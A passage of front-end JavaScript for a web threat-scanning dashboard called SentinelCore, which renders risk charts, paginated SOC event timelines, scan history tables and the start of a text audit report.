  if (malShare) malShare.innerText = total > 0 ? `${Math.round((maliciousCount / total) * 100)}%` : "0%";

  // Update Threat Analytics Donut Chart, Risk Score Timeline Chart & Threat Activity Timeline
  updateThreatAnalyticsChart(safeCount, suspiciousCount, maliciousCount, total);
  updateActivityTimelineChart(history);
  fetchSocTimelineEvents();
  fetchSocAlertStats();
  fetchSocIncidentStats();

  // Update Recent & Full History Tables
  renderDashboardRecentTable(history.slice(0, 5));
  renderFullHistoryTable();
  renderHistory();
  refreshIcons();
}

// ================= THREAT ANALYTICS DONUT CHART =================
function updateThreatAnalyticsChart(safeCount, suspiciousCount, maliciousCount, total) {
  const emptyState = document.getElementById("threatChartEmpty");
  const chartWrapper = document.getElementById("threatChartWrapper");
  const canvas = document.getElementById("threatChartCanvas");
  const fallbackContainer = document.getElementById("nativeFallbackChart");
  const donutTotalNum = document.getElementById("donutTotalNum");

  const safeLegend = document.getElementById("legendSafeVal");
  const suspLegend = document.getElementById("legendSuspiciousVal");
  const malLegend = document.getElementById("legendMaliciousVal");

  if (donutTotalNum) donutTotalNum.innerText = total;

  if (total === 0) {
    if (emptyState) emptyState.style.display = "flex";
    if (chartWrapper) chartWrapper.style.display = "none";
    if (safeLegend) safeLegend.innerText = "0 (0%)";
    if (suspLegend) suspLegend.innerText = "0 (0%)";
    if (malLegend) malLegend.innerText = "0 (0%)";
    return;
  }

  if (emptyState) emptyState.style.display = "none";
  if (chartWrapper) chartWrapper.style.display = "flex";

  const safePct = Math.round((safeCount / total) * 100);
  const suspPct = Math.round((suspiciousCount / total) * 100);
  const malPct = Math.round((maliciousCount / total) * 100);

  if (safeLegend) safeLegend.innerText = `${safeCount} (${safePct}%)`;
  if (suspLegend) suspLegend.innerText = `${suspiciousCount} (${suspPct}%)`;
  if (malLegend) malLegend.innerText = `${maliciousCount} (${malPct}%)`;

  if (typeof Chart !== "undefined" && canvas) {
    registerDonutTooltipPositioner();
    canvas.style.display = "block";
    if (fallbackContainer) fallbackContainer.style.display = "none";

    if (threatChartInstance) {
      threatChartInstance.data.datasets[0].data = [safeCount, suspiciousCount, maliciousCount];
      threatChartInstance.update();
    } else {
      const ctx = canvas.getContext("2d");
      threatChartInstance = new Chart(ctx, {
        type: "doughnut",
        data: {
          labels: ["Safe", "Suspicious", "Malicious"],
          datasets: [
            {
              data: [safeCount, suspiciousCount, maliciousCount],
              backgroundColor: ["#10B981", "#F59E0B", "#EF4444"],
              borderColor: "#111B2D",
              borderWidth: 3,
              hoverOffset: 6
            }
          ]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          layout: {
            padding: 18
          },
          plugins: {
            legend: { display: false },
            tooltip: {
              position: Chart.Tooltip.positioners.donutOutside ? "donutOutside" : "nearest",
              caretPadding: 8,
              backgroundColor: "#0A101F",
              titleColor: "#F8FAFC",
              bodyColor: "#CBD5E1",
              borderColor: "#00B8F0",
              borderWidth: 1,
              padding: 10,
              usePointStyle: true,
              callbacks: {
                label: (context) => {
                  const val = context.parsed;
                  const pct = Math.round((val / total) * 100);
                  return ` ${context.label}: ${val} target${val === 1 ? "" : "s"} (${pct}%)`;
                }
              }
            }
          },
          cutout: "74%"
        }
      });
    }
  } else {
    renderSvgDonutFallback(safeCount, suspiciousCount, maliciousCount, total, fallbackContainer, canvas);
  }
}

// Helper to extract concise clock time from locale timestamp string
function formatShortTimestamp(timeStr) {
  if (!timeStr) return "--:--";
  const match = String(timeStr).match(/(\d{1,2}:\d{2})(?::\d{2})?\s*(AM|PM)?/i);
  if (match) {
    return match[2] ? `${match[1]} ${match[2].toUpperCase()}` : match[1];
  }
  return String(timeStr).slice(-8);
}

// ================= SESSION RISK ACTIVITY TIMELINE CHART =================
function updateActivityTimelineChart(history) {
  const emptyState = document.getElementById("activityChartEmpty");
  const wrapper = document.getElementById("activityChartWrapper");
  const canvas = document.getElementById("activityChartCanvas");
  const avgBadge = document.getElementById("avgRiskBadge");
  const countBadge = document.getElementById("activityScanCount");

  // Chronological order (oldest -> newest, up to latest 15 real scans)
  const chronological = [...history].reverse().slice(-15);

  if (countBadge) {
    countBadge.innerText = `${chronological.length} SCAN${chronological.length === 1 ? "" : "S"}`;
  }

  if (chronological.length === 0) {
    activityChartMeta = [];
    if (emptyState) emptyState.style.display = "flex";
    if (wrapper) wrapper.style.display = "none";
    if (avgBadge) avgBadge.innerText = "AVG: -- / 100";
    return;
  }

  if (emptyState) emptyState.style.display = "none";
  if (wrapper) wrapper.style.display = "block";

  activityChartMeta = chronological.map((item, idx) => {
    const score = (item.fullData && typeof item.fullData.risk?.riskScore === "number")
      ? item.fullData.risk.riskScore
      : ((item.verdict || item.severity || "").toUpperCase() === "MALICIOUS" ? 80
        : (item.verdict || item.severity || "").toUpperCase() === "SUSPICIOUS" ? 40 : 0);

    const verdict = (item.verdict || item.fullData?.risk?.verdict || item.severity || "SAFE").toUpperCase();
    const severity = (item.severity || item.fullData?.risk?.severity || "LOW").toUpperCase();
    const threatCount = item.fullData?.risk?.threatCount ?? (item.fullData?.risk?.scoredThreats?.length || 0);
    const shortTime = formatShortTimestamp(item.time);

    let shortTarget = item.target || `Scan #${idx + 1}`;
    try {
      if (shortTarget.startsWith("http")) {
        shortTarget = new URL(shortTarget).hostname.replace(/^www\./, "").slice(0, 15);
      } else if (shortTarget.startsWith("HTML Source")) {
        shortTarget = `HTML #${idx + 1}`;
      } else {
        shortTarget = shortTarget.slice(0, 14);
      }
    } catch (_) {
      shortTarget = shortTarget.slice(0, 14);
    }

    return {
      fullTarget: item.target || `Scan #${idx + 1}`,
      shortLabel: `${shortTime} · ${shortTarget}`,
      time: item.time || "--",
      verdict,
      severity,
      score,
      threatCount
    };
  });

  const labels = activityChartMeta.map(m => m.shortLabel);
  const scores = activityChartMeta.map(m => m.score);
  const pointColors = activityChartMeta.map(m => {
    if (m.verdict === "MALICIOUS" || m.verdict === "HIGH") return "#EF4444";
    if (m.verdict === "SUSPICIOUS" || m.verdict === "MEDIUM") return "#F59E0B";
    if (m.verdict === "INCONCLUSIVE") return "#94A3B8";
    return "#10B981";
  });

  const avgScore = Math.round(scores.reduce((a, b) => a + b, 0) / scores.length);
  if (avgBadge) avgBadge.innerText = `AVG: ${avgScore} / 100`;

  if (typeof Chart !== "undefined" && canvas) {
    if (activityChartInstance) {
      activityChartInstance.data.labels = labels;
      activityChartInstance.data.datasets[0].data = scores;
      activityChartInstance.data.datasets[0].pointBackgroundColor = pointColors;
      activityChartInstance.update();
    } else {
      const ctx = canvas.getContext("2d");
      const gradient = ctx.createLinearGradient(0, 0, 0, 220);
      gradient.addColorStop(0, "rgba(0, 184, 240, 0.28)");
      gradient.addColorStop(1, "rgba(0, 184, 240, 0.0)");

      activityChartInstance = new Chart(ctx, {
        type: "line",
        data: {
          labels,
          datasets: [
            {
              label: "Risk Score",
              data: scores,
              borderColor: "#00B8F0",
              backgroundColor: gradient,
              borderWidth: 2,
              fill: true,
              tension: 0.3,
              pointRadius: 5.5,
              pointHoverRadius: 8,
              pointHitRadius: 16,
              pointBackgroundColor: pointColors,
              pointBorderColor: "#080D19",
              pointBorderWidth: 2
            }
          ]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          interaction: {
            mode: "index",
            intersect: false
          },
          plugins: {
            legend: { display: false },
            tooltip: {
              backgroundColor: "#0A101F",
              titleColor: "#F8FAFC",
              bodyColor: "#CBD5E1",
              borderColor: "#00B8F0",
              borderWidth: 1,
              padding: 12,
              displayColors: true,
              usePointStyle: true,
              callbacks: {
                title: (items) => {
                  if (!items || !items.length) return "";
                  const meta = activityChartMeta[items[0].dataIndex];
                  if (!meta) return items[0].label;
                  return meta.fullTarget.length > 48
                    ? meta.fullTarget.slice(0, 48) + "..."
                    : meta.fullTarget;
                },
                label: (ctx) => {
                  const meta = activityChartMeta[ctx.dataIndex];
                  if (!meta) return ` Risk Score: ${ctx.parsed.y} / 100`;
                  return ` Score: ${meta.score} / 100 (${meta.severity})`;
                },
                afterLabel: (ctx) => {
                  const meta = activityChartMeta[ctx.dataIndex];
                  if (!meta) return [];
                  return [
                    ` Verdict: ${meta.verdict}`,
                    ` Threats: ${meta.threatCount}`,
                    ` Time: ${meta.time}`
                  ];
                }
              }
            }
          },
          scales: {
            y: {
              min: 0,
              max: 100,
              ticks: {
                stepSize: 25,
                color: "#64748B",
                font: { family: "'JetBrains Mono', monospace", size: 10.5 }
              },
              grid: {
                color: "rgba(255, 255, 255, 0.05)"
              },
              border: { display: false }
            },
            x: {
              ticks: {
                color: "#64748B",
                font: { family: "'JetBrains Mono', monospace", size: 10 },
                maxRotation: 20,
                autoSkip: true,
                maxTicksLimit: 7
              },
              grid: { display: false },
              border: { display: false }
            }
          }
        }
      });
    }
  }
}

// ================= SOC EVENT MANAGEMENT & TIMELINE STREAM =================
let currentSocTimelinePage = 1;
const currentSocTimelineLimit = 6;
let currentSocTimelineVerdict = "";
let currentSocTimelineTotalPages = 1;
let isSocTimelineLoading = false;
let socTimelineInitialized = false;

function initSocTimelineControls() {
  if (socTimelineInitialized) return;
  socTimelineInitialized = true;

  const filterEl = document.getElementById("timelineVerdictFilter");
  if (filterEl) {
    filterEl.addEventListener("change", (e) => {
      currentSocTimelineVerdict = e.target.value;
      currentSocTimelinePage = 1;
      fetchSocTimelineEvents();
    });
  }

  const refreshBtn = document.getElementById("timelineRefreshBtn");
  if (refreshBtn) {
    refreshBtn.addEventListener("click", () => {
      fetchSocTimelineEvents();
    });
  }

  const retryBtn = document.getElementById("timelineRetryBtn");
  if (retryBtn) {
    retryBtn.addEventListener("click", () => {
      fetchSocTimelineEvents();
    });
  }

  const prevBtn = document.getElementById("timelinePrevBtn");
  if (prevBtn) {
    prevBtn.addEventListener("click", () => {
      if (currentSocTimelinePage > 1) {
        currentSocTimelinePage--;
        fetchSocTimelineEvents();
      }
    });
  }

  const nextBtn = document.getElementById("timelineNextBtn");
  if (nextBtn) {
    nextBtn.addEventListener("click", () => {
      if (currentSocTimelinePage < currentSocTimelineTotalPages) {
        currentSocTimelinePage++;
        fetchSocTimelineEvents();
      }
    });
  }
}

async function fetchSocTimelineEvents() {
  const loadingEl = document.getElementById("threatTimelineLoading");
  const errorEl = document.getElementById("threatTimelineError");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const listEl = document.getElementById("threatTimelineList");
  const paginationEl = document.getElementById("threatTimelinePagination");
  const countTag = document.getElementById("timelineCountTag");

  if (!listEl) return;

  isSocTimelineLoading = true;

  // 1. Loading State
  if (loadingEl) loadingEl.style.display = "flex";
  if (errorEl) errorEl.style.display = "none";
  if (emptyEl) emptyEl.style.display = "none";
  if (listEl) listEl.style.display = "none";
  if (paginationEl) paginationEl.style.display = "none";

  const apiHost = API_BASE;
  const params = new URLSearchParams({
    page: String(currentSocTimelinePage),
    limit: String(currentSocTimelineLimit),
    sort: "newest"
  });

  if (currentSocTimelineVerdict) {
    params.set("verdict", currentSocTimelineVerdict);
  }

  if (!socCurrentUser) return;

  try {
    const res = await socFetch(`${apiHost}/api/soc/events?${params.toString()}`);
    if (!res) return;
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}: ${res.statusText || "Service Unavailable"}`);
    }
    const data = await res.json();
    if (!data.success) {
      throw new Error(data.error || "SOC event retrieval failed");
    }

    renderSocTimelineEvents(data);
  } catch (err) {
    console.warn("SOC timeline fetch error:", err.message);

    // 2. Error State
    if (loadingEl) loadingEl.style.display = "none";
    if (emptyEl) emptyEl.style.display = "none";
    if (listEl) listEl.style.display = "none";
    if (paginationEl) paginationEl.style.display = "none";
    if (errorEl) {
      errorEl.style.display = "flex";
      const msgEl = document.getElementById("timelineErrorMsg");
      if (msgEl) msgEl.textContent = `Endpoint /api/soc/events unreachable (${err.message}).`;
    }
    if (countTag) countTag.innerText = "OFFLINE";
  } finally {
    isSocTimelineLoading = false;
    refreshIcons();
  }
}

function renderSocTimelineEvents(data) {
  const loadingEl = document.getElementById("threatTimelineLoading");
  const errorEl = document.getElementById("threatTimelineError");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const listEl = document.getElementById("threatTimelineList");
  const paginationEl = document.getElementById("threatTimelinePagination");
  const countTag = document.getElementById("timelineCountTag");
  const pageInfoEl = document.getElementById("timelinePageInfo");
  const prevBtn = document.getElementById("timelinePrevBtn");
  const nextBtn = document.getElementById("timelineNextBtn");

  if (loadingEl) loadingEl.style.display = "none";
  if (errorEl) errorEl.style.display = "none";

  const events = Array.isArray(data?.events) ? data.events : [];
  const total = Number(data?.total || 0);
  const page = Number(data?.page || 1);
  const totalPages = Number(data?.totalPages || 1);

  currentSocTimelinePage = page;
  currentSocTimelineTotalPages = totalPages;

  if (countTag) {
    countTag.innerText = `${total} EVENT${total === 1 ? "" : "S"}`;
  }

  // 3. Empty State
  if (events.length === 0) {
    if (emptyEl) emptyEl.style.display = "flex";
    if (listEl) listEl.style.display = "none";
    if (paginationEl) paginationEl.style.display = "none";
    return;
  }

  // 4. Populated State
  if (emptyEl) emptyEl.style.display = "none";
  if (listEl) {
    listEl.style.display = "flex";
    listEl.innerHTML = "";

    events.forEach(ev => {
      const verdict = String(ev.verdict || "SAFE").toUpperCase();
      const score = typeof ev.riskScore === "number" ? ev.riskScore : "--";
      const threatCount = typeof ev.threatCount === "number" ? ev.threatCount : 0;
      const vClass =
        verdict === "MALICIOUS" ? "malicious" :
        verdict === "SUSPICIOUS" ? "suspicious" :
        verdict === "INCONCLUSIVE" ? "inconclusive" : "safe";

      const row = document.createElement("div");
      row.className = "timeline-item";
      row.title = `Event: ${ev.eventId || "SOC"} | Click to inspect full scan result`;
      row.onclick = () => loadSocEventItem(ev);

      const dot = document.createElement("span");
      dot.className = `timeline-dot ${vClass}`;

      const content = document.createElement("div");
      content.className = "timeline-content";

      const top = document.createElement("div");
      top.className = "timeline-top";

      const targetWrap = document.createElement("div");
      targetWrap.className = "timeline-target-wrap";

      const targetSpan = document.createElement("span");
      targetSpan.className = "timeline-target";
      targetSpan.textContent = ev.target || "Unknown Target";

      const eventIdSpan = document.createElement("span");
      eventIdSpan.className = "timeline-event-id";
      eventIdSpan.textContent = ev.eventId ? ev.eventId.slice(0, 11) : "sec";

      targetWrap.appendChild(targetSpan);
      targetWrap.appendChild(eventIdSpan);

      const scorePill = document.createElement("span");
      scorePill.className = `timeline-score-pill ${vClass}`;
      scorePill.textContent = `${score}/100`;

      top.appendChild(targetWrap);
      top.appendChild(scorePill);

      const meta = document.createElement("div");
      meta.className = "timeline-meta";

      const verdictTag = document.createElement("span");
      verdictTag.className = `timeline-verdict-tag ${vClass}`;
      verdictTag.textContent = `${verdict} • ${threatCount} threat${threatCount === 1 ? "" : "s"}`;

      const timeEl = document.createElement("span");
      timeEl.className = "timeline-time";
      const evDate = ev.timestamp ? new Date(ev.timestamp) : new Date();
      timeEl.textContent = isNaN(evDate.getTime()) ? "--" : evDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });

      meta.appendChild(verdictTag);
      meta.appendChild(timeEl);

      content.appendChild(top);
      content.appendChild(meta);

      row.appendChild(dot);
      row.appendChild(content);
      listEl.appendChild(row);
    });
  }

  // 5. Pagination State
  if (paginationEl) {
    if (totalPages > 1) {
      paginationEl.style.display = "flex";
      if (pageInfoEl) pageInfoEl.innerText = `Page ${page} of ${totalPages}`;
      if (prevBtn) prevBtn.disabled = page <= 1;
      if (nextBtn) nextBtn.disabled = page >= totalPages;
    } else {
      paginationEl.style.display = "none";
    }
  }
}

function loadSocEventItem(ev) {
  if (!ev) return;
  switchView("scanner");

  const isUrl = ev.targetType === "URL" || (typeof ev.target === "string" && /^https?:\/\//i.test(ev.target));
  const restoredInput = isUrl ? ev.target : (ev.rawInputPreview || "");
  const inputField = document.getElementById("inputData");

  if (isUrl) {
    setScanMode("url");
  } else {
    setScanMode("html");
  }

  if (inputField) {
    inputField.value = restoredInput;
  }

  const threatFindings = (ev.detectionEvidence || []).filter(e => e.isThreat);
  const infoFindings = (ev.detectionEvidence || []).filter(e => !e.isThreat);

  const syntheticData = {
    risk: {
      verdict: ev.verdict,
      severity: ev.severity,
      riskScore: ev.riskScore,
      scanCoverage: ev.scanCoverage,
      threatCount: ev.threatCount ?? threatFindings.length,
      infoCount: ev.infoCount ?? infoFindings.length,
      scoredThreats: threatFindings,
      evidenceFindings: ev.detectionEvidence || [],
      scoreExplanation: ev.remediation?.summary || "",
      factors: threatFindings.map(t => `${t.name} (+${t.scoreContribution || 0})`),
      remediation: ev.remediation || {}
    },
    analysis: {
      target: ev.target,
      totalScripts: ev.staticMetrics?.totalScripts || 0,
      totalIframes: ev.staticMetrics?.totalIframes || 0,
      hiddenElementsDetected: Boolean(ev.staticMetrics?.hiddenElementsDetected),
      findings: ev.detectionEvidence || [],
      metrics: ev.staticMetrics || {}
    },
    virusTotal: ev.virusTotal || { available: false, status: "unavailable" }
  };

  renderScanResult(ev.target, syntheticData, {
    rawInput: restoredInput,
    timestamp: ev.timestamp ? new Date(ev.timestamp).toLocaleString() : new Date().toLocaleString()
  });
}

function renderThreatActivityTimeline(history) {
  // Legacy session fallback helper
  const listEl = document.getElementById("threatTimelineList");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const countTag = document.getElementById("timelineCountTag");

  if (!listEl || !emptyEl) return;

  if (countTag) {
    countTag.innerText = `${history.length} EVENT${history.length === 1 ? "" : "S"}`;
  }

  listEl.innerHTML = "";

  if (!history || history.length === 0) {
    emptyEl.style.display = "flex";
    listEl.style.display = "none";
    return;
  }

  emptyEl.style.display = "none";
  listEl.style.display = "flex";

  history.slice(0, 10).forEach(item => {
    const verdict = (item.verdict || item.fullData?.risk?.verdict || item.severity || "SAFE").toUpperCase();
    const score = item.fullData?.risk?.riskScore ?? "--";
    const threatCount = item.fullData?.risk?.threatCount ?? (item.fullData?.risk?.scoredThreats?.length || 0);
    const vClass =
      verdict === "MALICIOUS" || verdict === "HIGH" ? "malicious" :
      verdict === "SUSPICIOUS" || verdict === "MEDIUM" ? "suspicious" :
      verdict === "INCONCLUSIVE" ? "inconclusive" : "safe";

    const row = document.createElement("div");
    row.className = "timeline-item";
    row.title = "Click to open full scan result";
    row.onclick = () => loadHistoryItem(item);

    const dot = document.createElement("span");
    dot.className = `timeline-dot ${vClass}`;

    const content = document.createElement("div");
    content.className = "timeline-content";

    const top = document.createElement("div");
    top.className = "timeline-top";

    const target = document.createElement("span");
    target.className = "timeline-target";
    target.textContent = item.target || "Unknown Target";

    const scorePill = document.createElement("span");
    scorePill.className = `timeline-score-pill ${vClass}`;
    scorePill.textContent = `${score}/100`;

    top.appendChild(target);
    top.appendChild(scorePill);

    const meta = document.createElement("div");
    meta.className = "timeline-meta";

    const verdictTag = document.createElement("span");
    verdictTag.className = `timeline-verdict-tag ${vClass}`;
    verdictTag.textContent = `${verdict} • ${threatCount} threat${threatCount === 1 ? "" : "s"}`;

    const timeEl = document.createElement("span");
    timeEl.textContent = item.time || "--";

    meta.appendChild(verdictTag);
    meta.appendChild(timeEl);

    content.appendChild(top);
    content.appendChild(meta);

    row.appendChild(dot);
    row.appendChild(content);
    listEl.appendChild(row);
  });
}

function renderSvgDonutFallback(safe, susp, mal, total, container, canvas) {
  if (canvas) canvas.style.display = "none";
  if (!container) return;

  container.style.display = "flex";
  const r = 50;
  const c = 2 * Math.PI * r;

  const safeDash = (safe / total) * c;
  const suspDash = (susp / total) * c;
  const malDash = (mal / total) * c;

  const safeOffset = 0;
  const suspOffset = -safeDash;
  const malOffset = -(safeDash + suspDash);

  container.innerHTML = `
    <svg width="140" height="140" viewBox="0 0 140 140" style="transform: rotate(-90deg);">
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#1E293B" stroke-width="18" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#10B981" stroke-width="18"
        stroke-dasharray="${safeDash} ${c - safeDash}" stroke-dashoffset="${safeOffset}" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#F59E0B" stroke-width="18"
        stroke-dasharray="${suspDash} ${c - suspDash}" stroke-dashoffset="${suspOffset}" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#EF4444" stroke-width="18"
        stroke-dasharray="${malDash} ${c - malDash}" stroke-dashoffset="${malOffset}" />
    </svg>
  `;
}

// ================= RENDER RECENT & FULL HISTORY TABLES =================
function renderDashboardRecentTable(recentList) {
  const tbody = document.getElementById("dashboardRecentTableBody");
  const emptyBox = document.getElementById("dashboardTableEmpty");

  if (!tbody) return;
  tbody.innerHTML = "";

  if (!recentList || recentList.length === 0) {
    if (emptyBox) emptyBox.style.display = "flex";
    return;
  }

  if (emptyBox) emptyBox.style.display = "none";

  recentList.forEach((item, index) => {
    tbody.appendChild(createHistoryTableRow(item, index));
  });
}

function renderFullHistoryTable() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];
  const tbody = document.getElementById("historyTableBody");
  const emptyState = document.getElementById("fullHistoryEmpty");
  const searchInput = document.getElementById("historySearchInput");
  const searchTerm = searchInput ? searchInput.value.toLowerCase().trim() : "";

  if (!tbody) return;
  tbody.innerHTML = "";

  const filtered = history.filter(item => {
    const verdictUpper = (item.verdict || item.severity || "SAFE").toUpperCase();
    const severityMatch =
      currentHistoryFilter === "ALL" ||
      verdictUpper === currentHistoryFilter ||
      (currentHistoryFilter === "SAFE" && (verdictUpper === "LOW" || verdictUpper === "SAFE")) ||
      (currentHistoryFilter === "SUSPICIOUS" && (verdictUpper === "MEDIUM" || verdictUpper === "SUSPICIOUS")) ||
      (currentHistoryFilter === "MALICIOUS" && (verdictUpper === "HIGH" || verdictUpper === "MALICIOUS"));

    const searchMatch = !searchTerm ||
      (item.target || "").toLowerCase().includes(searchTerm) ||
      verdictUpper.toLowerCase().includes(searchTerm) ||
      (item.time || "").toLowerCase().includes(searchTerm);
    return severityMatch && searchMatch;
  });

  if (filtered.length === 0) {
    if (emptyState) emptyState.style.display = "flex";
    return;
  }

  if (emptyState) emptyState.style.display = "none";

  filtered.forEach((item, index) => {
    tbody.appendChild(createHistoryTableRow(item, index));
  });
}

function createHistoryTableRow(item, index) {
  const tr = document.createElement("tr");

  const verdictUpper = (item.verdict || item.severity || "SAFE").toUpperCase();
  const severityUpper = (item.severity || "LOW").toUpperCase();
  const isUrl = (item.target || "").startsWith("http");

  const tdTarget = document.createElement("td");
  const targetWrap = document.createElement("div");
  targetWrap.className = "table-target-wrap";

  const typeIcon = document.createElement("span");
  typeIcon.className = `target-type-icon ${isUrl ? "url" : "html"}`;
  typeIcon.innerHTML = isUrl
    ? `<i data-lucide="globe" class="icon-14"></i>`
    : `<i data-lucide="code-2" class="icon-14"></i>`;

  const targetText = document.createElement("span");
  targetText.className = "table-target-text";
  targetText.textContent = item.target || "Unknown Target";
  targetText.title = item.target || "";

  targetWrap.appendChild(typeIcon);
  targetWrap.appendChild(targetText);
  tdTarget.appendChild(targetWrap);

  const tdDate = document.createElement("td");
  tdDate.className = "table-date-cell";
  tdDate.textContent = item.time || "--";

  const tdSeverity = document.createElement("td");
  const badge = document.createElement("span");
  badge.className = `status-badge ${severityUpper.toLowerCase()}`;
  badge.innerText = severityUpper;
  tdSeverity.appendChild(badge);

  const tdStatus = document.createElement("td");
  const statusLabel = document.createElement("span");
  const verdictClass =
    verdictUpper === "SAFE" || verdictUpper === "LOW" ? "low" :
    verdictUpper === "SUSPICIOUS" || verdictUpper === "MEDIUM" ? "medium" :
    verdictUpper === "MALICIOUS" || verdictUpper === "HIGH" ? "high" : "inconclusive";

  statusLabel.className = `risk-status-text ${verdictClass}`;
  statusLabel.innerText = verdictUpper;
  tdStatus.appendChild(statusLabel);

  const tdAction = document.createElement("td");
  tdAction.className = "text-right";

  const actionBtn = document.createElement("button");
  actionBtn.className = "btn-table-action";
  actionBtn.innerHTML = `
    <i data-lucide="eye" class="icon-13"></i>
    <span>${item.fullData ? "View Result" : "Inspect Target"}</span>
  `;
  actionBtn.onclick = () => loadHistoryItem(item);

  tdAction.appendChild(actionBtn);

  tr.appendChild(tdTarget);
  tr.appendChild(tdDate);
  tr.appendChild(tdSeverity);
  tr.appendChild(tdStatus);
  tr.appendChild(tdAction);

  return tr;
}

function loadHistoryItem(item) {
  if (!item) return;

  switchView("scanner");

  const isUrl = typeof item.target === "string" && (item.target.startsWith("http://") || item.target.startsWith("https://"));
  const restoredInput = item.rawInput || (isUrl ? item.target : "");
  const inputField = document.getElementById("inputData");

  if (isUrl) {
    setScanMode("url");
  } else if (restoredInput) {
    setScanMode("html");
  }

  if (inputField) {
    inputField.value = restoredInput;
  }

  if (item.fullData) {
    renderScanResult(item.target, item.fullData, {
      rawInput: restoredInput,
      timestamp: item.time || new Date().toLocaleString()
    });
  } else {
    showSocAlert({
      icon: "info",
      title: "Historical Scan Record",
      text: `Target: ${item.target} | Verdict: ${item.verdict || item.severity} | Date: ${item.time}. Click 'Scan Website' to execute a fresh deep scan.`
    });
  }
}

function filterHistoryTable() {
  renderFullHistoryTable();
  refreshIcons();
}

function setHistoryFilter(severity) {
  currentHistoryFilter = severity;
  const pills = document.querySelectorAll(".filter-pill");
  pills.forEach(pill => {
    if (pill.getAttribute("data-filter") === severity) {
      pill.classList.add("active");
    } else {
      pill.classList.remove("active");
    }
  });
  renderFullHistoryTable();
  refreshIcons();
}

// ================= SEVERITY GUIDE & REPORT DOWNLOAD =================
function toggleSeverityGuide() {
  const content = document.getElementById("severityContent");
  const toggle = document.getElementById("severityToggle");

  if (!content || !toggle) return;

  if (content.style.display === "none") {
    content.style.display = "block";
    toggle.innerText = "−";
    if (typeof gsap !== "undefined") {
      gsap.fromTo(content, { opacity: 0, y: -6 }, { opacity: 1, y: 0, duration: 0.25, ease: "power2.out" });
    }
  } else {
    content.style.display = "none";
    toggle.innerText = "+";
  }

  if (lenisInstance) lenisInstance.resize();
}

function downloadReport() {
  const verdictEl = document.getElementById("securityVerdict");
  const severityEl = document.getElementById("severity");
  const riskScoreEl = document.getElementById("riskScore");
  const scanTimeEl = document.getElementById("scanTime");
  const coverageEl = document.getElementById("scanCoverageBadge");
  const scriptsEl = document.getElementById("scripts");
  const extResEl = document.getElementById("domExternalResources");
  const formsEl = document.getElementById("domFormsCount");
  const iframesEl = document.getElementById("iframes");
  const hiddenEl = document.getElementById("hidden");
  const passEl = document.getElementById("domPasswordFields");
  const handlersEl = document.getElementById("domEventHandlers");
  const payloadEl = document.getElementById("domPayloadSize");
  const keywordsEl = document.getElementById("keywords");
  const vtMaliciousEl = document.getElementById("vtMalicious");
  const vtSuspiciousEl = document.getElementById("vtSuspicious");
  const vtHarmlessEl = document.getElementById("vtHarmless");
  const vtUndetectedEl = document.getElementById("vtUndetected");
  const vtTotalEl = document.getElementById("vtTotalEngines");
  const vtRepEl = document.getElementById("vtReputation");
  const vtTsEl = document.getElementById("vtAnalysisTimestamp");
  const vtStatusNote = document.getElementById("vtStatusNote");

  const verdict = verdictEl ? verdictEl.textContent : "UNKNOWN";
  const severity = severityEl ? severityEl.textContent : "LOW";
  const riskScore = riskScoreEl ? riskScoreEl.textContent : "0";

  if (!verdict || !lastRenderedScanData) {
    showSocAlert({
      icon: "info",
      title: "No Report Available",
      text: "Please execute a target scan first before downloading an audit report."
    });
    return;
  }

  const scanData = lastRenderedScanData?.data || null;
  const scoredThreats = Array.isArray(scanData?.risk?.scoredThreats)
    ? scanData.risk.scoredThreats
    : [];
  const unifiedEntries = cachedEvidenceEntries && cachedEvidenceEntries.length > 0
    ? cachedEvidenceEntries
    : buildUnifiedEvidenceEntries(
        scanData?.risk?.evidenceFindings || scanData?.analysis?.findings || [],
        scoredThreats
      );

  const contributionsSection = scoredThreats.length > 0
    ? scoredThreats
        .map(
          (item, idx) =>
            `${idx + 1}. [+${item.scoreContribution || 0} pts] ${item.name || "Threat Signal"} (${item.severity || "LOW"} | ${item.source || "ENGINE"})` +
            (item.evidence ? `\n   Evidence: ${item.evidence}` : "")
        )
        .join("\n")
    : "No risk-scoring threat contributions were recorded.";

  const findingsSection = unifiedEntries.length > 0
    ? unifiedEntries
        .map((item, idx) => {
          const lines = [
            `${idx + 1}. [${item.severity || "INFO"}] ${item.name || "Security Observation"} (${item.category}) [+${item.scoreContribution || 0} pts]`
          ];
          if (item.explanation) lines.push(`   Detail:      ${item.explanation}`);
          if (item.evidence) lines.push(`   Evidence:    ${item.evidence}`);
          if (item.recommendedAction) lines.push(`   Remediation: ${item.recommendedAction}`);
          return lines.join("\n");
        })
        .join("\n\n")
    : "No specific threat indicators or diagnostic observations recorded.";

  const reportText = `
SentinelCore Web Threat Detection Report (Engine v2.1)
======================================================
Target: ${lastRenderedScanData?.target || document.getElementById("resultTargetValue")?.textContent || "Unknown"}
Scan Time: ${scanTimeEl ? scanTimeEl.textContent : ""}

EXECUTIVE SECURITY SUMMARY
--------------------------
Security Verdict: ${verdict}
Risk Severity:    ${severity}
Risk Score:       ${riskScore} / 100 (Evidence-Based Sum)
Scan Coverage:    ${coverageEl ? coverageEl.textContent : "Full Inspection"}

VIRUSTOTAL THREAT INTELLIGENCE
------------------------------
- Status:               ${vtStatusNote ? vtStatusNote.textContent : "N/A"}
- Analysis Timestamp:   ${vtTsEl ? vtTsEl.textContent : "N/A"}
- Malicious Detections: ${vtMaliciousEl ? vtMaliciousEl.textContent : "N/A"}
- Suspicious Flags:     ${vtSuspiciousEl ? vtSuspiciousEl.textContent : "N/A"}
- Harmless Engines:     ${vtHarmlessEl ? vtHarmlessEl.textContent : "N/A"}
- Undetected Engines:   ${vtUndetectedEl ? vtUndetectedEl.textContent : "N/A"}
- Total Engines:        ${vtTotalEl ? vtTotalEl.textContent : "N/A"}
- Community Reputation: ${vtRepEl ? vtRepEl.textContent : "N/A"}

STATIC DOM & HEURISTIC INSPECTION
